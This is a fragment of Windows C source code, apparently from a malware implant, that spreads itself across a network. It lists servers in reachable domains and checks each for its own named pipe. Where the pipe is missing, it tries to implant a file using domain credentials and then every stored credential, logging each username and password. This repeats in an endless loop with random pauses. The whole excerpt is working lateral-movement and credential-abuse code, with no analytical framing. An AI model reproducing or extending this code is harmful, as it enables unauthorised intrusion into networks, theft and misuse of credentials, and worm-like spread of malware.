		msCredsListContext.lDataLen = 0;

		while (cmGetCredentialsForDomain(wszTargetDomain, wszUsername, wszPassword, &msCredsListContext)) {

			DbgPrint("using creds u=[%ws] p=[%ws]", wszUsername, wszPassword);

			if (bRes = rdpAttemptReplication(wszTargetMachine, wszUsername, wszPassword)) { DbgPrint("SUCCESS low"); break; }

		}

#endif

		if (bRes) { break; }

		DbgPrint("nothing succeeded with [%ws]", wszTargetMachine);

	} while (FALSE);	// not a loop

	// free resources
	if (wszUsername) { my_free(wszUsername); }
	if (wszUsernameMod) { my_free(wszUsernameMod); }
	if (wszPassword) { my_free(wszPassword); }

	return bRes;
}



// enum function for dlmEnumV2()
// should return FALSE to stop enumeration on current network level (not all enum will be stopped, so multiple FALSE returns may be needed)
// wszCurrentDomain may be NULL in case no domain/workgroup 
BOOL CALLBACK fnEnumFunc(LPNETRESOURCE lpnr, LPWSTR wszCurrentDomain, LPVOID pCallbackParam)
{

	// we receive different elements, proceed on servers/machines only - lpnr->dwDisplayType == RESOURCEDISPLAYTYPE_SERVER (2)
	if ((lpnr->dwDisplayType == RESOURCEDISPLAYTYPE_SERVER) && (!drIsSelfMachine(lpnr->lpRemoteName))) {

		DbgPrint("processing server [%ws] on domain [%ws]", lpnr->lpRemoteName, wszCurrentDomain);

		// check if pipe is connectable / working on remote side
		if (!pwIsRemotePipeWorkingTimeout(lpnr->lpRemoteName, 2500, 200)) {

			DbgPrint("no pipe, attempt to implant file");

			do {	// not a loop

				DbgPrint("attempting with domain");
				if (drAttemptReplication(lpnr->lpRemoteName, wszCurrentDomain)) { DbgPrint("OK as for domain"); break; }

				DbgPrint("attempting with all creds available");
				if (drAttemptReplication(lpnr->lpRemoteName, NULL)) { DbgPrint("OK as for all creds"); break; }

			} while (FALSE);	// not a loop

		} else { DbgPrint("pipe exists, ok"); }

	} // RESOURCEDISPLAYTYPE_SERVER


	// continue enum
	return TRUE;	
}

// initialize domain replication process
VOID infStartDomainReplication()
{
	RndClass rg = { 0 };	// random generator
	DWORD dwMinsToWait;	// amount of time (minutes) to wait before next turn

	DbgPrint("entered");

	// prepare rnd
	rgNew(&rg);

	// get list of all visible machines in current domain
	//dlmEnumV1(NULL);

	while (TRUE) {

		DbgPrint("loop start");
		// no shares enum, but search all available networks
		dlmEnumV2(FALSE, TRUE, fnEnumFunc, NULL);

		// calc next wait period
		rg.rgInitSeedFromTime(&rg);
		dwMinsToWait = rg.rgGetRnd(&rg, REPLICATION_RESTART_MIN, REPLICATION_RESTART_MAX);

		// do wait
		DbgPrint("done enum, waiting %u mins before next turn...", dwMinsToWait);
		Sleep(dwMinsToWait * 60 * 1000);

	}	// infinite loop

}